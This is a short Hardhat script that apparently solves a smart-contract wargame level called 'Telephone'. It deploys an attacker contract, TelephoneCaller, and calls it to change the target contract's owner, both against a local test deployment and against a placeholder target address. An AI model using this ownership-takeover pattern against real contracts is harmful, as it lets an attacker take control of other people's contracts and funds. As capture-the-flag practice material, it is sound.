import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const telephoneFactory = await ethers.getContractFactory("Telephone");
  const telephone = await telephoneFactory.deploy();
  await telephone.waitForDeployment();

  const telephoneCallerFactory = await ethers.getContractFactory(
    "TelephoneCaller"
  );
  const telephoneCaller = await telephoneCallerFactory.deploy(
    await telephone.getAddress()
  );
  await telephoneCaller.waitForDeployment();

  const tx = await telephoneCaller.callChangeOwner();
  await tx.wait();
}

async function handleReal() {
  const telephoneCallerFactory = await ethers.getContractFactory(
    "TelephoneCaller"
  );
  const telephoneCaller = await telephoneCallerFactory.deploy(
    "0xSPACEGENTLEMAN"
  );
  await telephoneCaller.waitForDeployment();

  const tx = await telephoneCaller.callChangeOwner();
  await tx.wait();
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
